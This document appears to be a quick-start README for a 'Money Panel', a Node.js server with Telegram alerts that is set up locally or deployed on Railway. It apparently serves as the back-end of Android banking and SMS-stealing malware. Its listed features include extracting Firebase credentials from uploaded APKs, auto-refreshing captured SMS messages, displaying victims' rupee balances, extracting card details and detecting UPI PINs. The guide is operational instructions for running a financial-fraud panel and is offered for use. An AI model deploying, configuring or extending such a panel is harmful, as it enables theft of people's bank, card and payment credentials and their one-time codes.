# 🚀 MONEY PANEL - QUICK START GUIDE

## Local Testing (Right Now!)

### 1. Install Dependencies
```bash
cd "money new panel"
npm install
```

### 2. Setup Telegram (Optional but Recommended)

Create `.env` file:
```bash
PORT=3000
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
```

**Get Telegram Bot Token:**
- Open Telegram → search `@BotFather`
- Send `/newbot` command
- Follow instructions
- Copy token

**Get Chat ID:**
- Search `@userinfobot` on Telegram
- Start chat → get your ID
- Or use `@RawDataBot` for groups

### 3. Start Server
```bash
npm start
```

Server starts at: http://localhost:3000

### 4. Test Features

✅ **Upload APK:** Drag & drop any APK file  
✅ **Auto-Scan:** Firebase credentials extracted automatically  
✅ **Telegram Alert:** Bot receives notification with APK data  
✅ **SMS Refresh:** Auto-refreshes every 45 seconds  
✅ **Balance Display:** Shows ₹ amounts properly  

## Railway Deployment

### Method 1: With GitHub

1. Push code to GitHub
2. Go to Railway.app
3. Click "New Project" → "Deploy from GitHub"
4. Select your repo
5. Add environment variables:
   ```
   TELEGRAM_BOT_TOKEN=your_token
   TELEGRAM_CHAT_ID=your_chat_id
   ```
6. Deploy! ✅

### Method 2: Railway CLI

```bash
# Install Railway CLI
npm install -g @railway/cli

# Login
railway login

# Deploy
railway up
```

### Add Environment Variables on Railway:

1. Go to your project
2. Click "Variables" tab
3. Add:
   - `TELEGRAM_BOT_TOKEN`
   - `TELEGRAM_CHAT_ID`
4. Redeploy

## Verify Everything Works

### Check Console Logs:
```
✅ Server running on port 3000
✅ Telegram Bot: Configured (Chat: -1001234567890)
```

### Test APK Upload:
1. Open panel
2. Upload any APK
3. Check Telegram → notification received
4. Credentials auto-filled

### Test SMS Refresh:
1. Connect Firebase account
2. Wait 45 seconds
3. Console shows: "SMS refresh triggered"
4. Cards update automatically

### Check Balance Display:
- Balance shows: ₹123,456.78 ✅
- Logo shows: MONEY PANEL ✅
- Transaction type color-coded ✅

## All Features

✅ APK scanning with Telegram upload  
✅ Auto SMS refresh (45s interval)  
✅ Balance display with ₹ symbol  
✅ Device status monitoring  
✅ Bank account detection  
✅ Card info extraction  
✅ UPI PIN detection  
✅ Real-time updates  

## Troubleshooting

**Telegram not working:**
```bash
# Check .env file exists
# Verify token and chat ID correct
# Test: curl http://localhost:3000/api/health
```

**SMS not refreshing:**
```javascript
// Check browser console for errors
// Verify Firebase permissions
```

**Port already in use:**
```bash
# Change PORT in .env file
PORT=3001
```

## 🎉 Ready to Use!

Your Money Panel is fully configured and ready for deployment!

**Need help?** Check `FIXES-APPLIED.md` for detailed technical info.

